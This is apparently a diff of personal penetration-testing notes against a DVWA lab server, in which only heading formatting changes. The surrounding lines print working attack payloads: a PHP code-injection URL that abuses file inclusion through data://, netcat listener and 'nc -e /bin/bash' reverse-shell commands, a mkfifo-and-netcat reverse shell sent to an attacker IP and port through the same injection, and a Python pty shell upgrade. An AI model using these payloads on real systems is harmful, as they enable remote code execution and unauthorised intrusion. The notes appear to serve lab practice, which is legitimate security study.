@@ -44,12 +44,12 @@ Login failed is the login failure message that the form returned
 http://10.0.2.100/vulnerabilities/fi/?COMMAND=ls&page=data://text/plain,%3C?php%20system($_GET[%27COMMAND%27]);%20?%3E
 
 
-##NC Reverse Shell
+## NC Reverse Shell
 
-###Terminal
+### Terminal
 `nc -lvvvnp 4444`
 
-###Target
+### Target
 `nc <your IP> 4444 –e /bin/bash`
 
 http://10.0.2.100/vulnerabilities/fi/?page=data://text/plain,<?php system('TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>%261 | nc ${TARGET} ${PORT} >${PIPE}'); ?>
@@ -66,13 +66,11 @@ TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat
 http://10.0.2.100/vulnerabilities/fi/?page=data://text/plain,<?php system('TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>%261 | nc ${TARGET} ${PORT} >${PIPE}'); ?>
 
 
-##BASH STUFFS
+## BASH STUFFS  
 `ls -all`
 `find <desireddirectory> | grep <filename>`
 
-```bash
 
-##Propper shell
+## Propper shell  
 `echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`
 `python3 /tmp/asdf.py`
-```bash
